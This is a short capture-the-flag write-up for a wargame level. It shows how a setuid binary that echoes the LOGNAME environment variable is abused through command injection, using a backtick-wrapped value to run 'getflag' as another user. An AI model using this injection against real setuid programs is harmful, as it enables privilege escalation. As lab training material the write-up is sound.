# level07 - Environnement variable command injection

## Summary

on our `HOME` (`/home/user/level07`), there is one binary file: `level07`

```shell
~$ ls -l

-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
<br>

As we can see, the **suid bit** is set by flag07 user so let’s disass it:

```shell
~$ strings level07

...
LOGNAME
/bin/echo %s
...
```
<br>

We deduce that a certain `LOGNAME` variable is printing by `echo` , which is actually an environment variable.

```shell
~$ env

...
LOGNAME=level07
...
```
So we can print the value of `LOGNAME` which can be, in our malicious head, a command…


<br>


## Exploit

Just put the command you want to execute as the value of `LOGNAME`,
between backstick of course to allow `echo` to display the result of the command:
```shell
export LOGNAME='`getflag`' && ~/level07
```
> On this exploit, we ran directly command `getflag` from flag07's user. So, just log on level08 user.
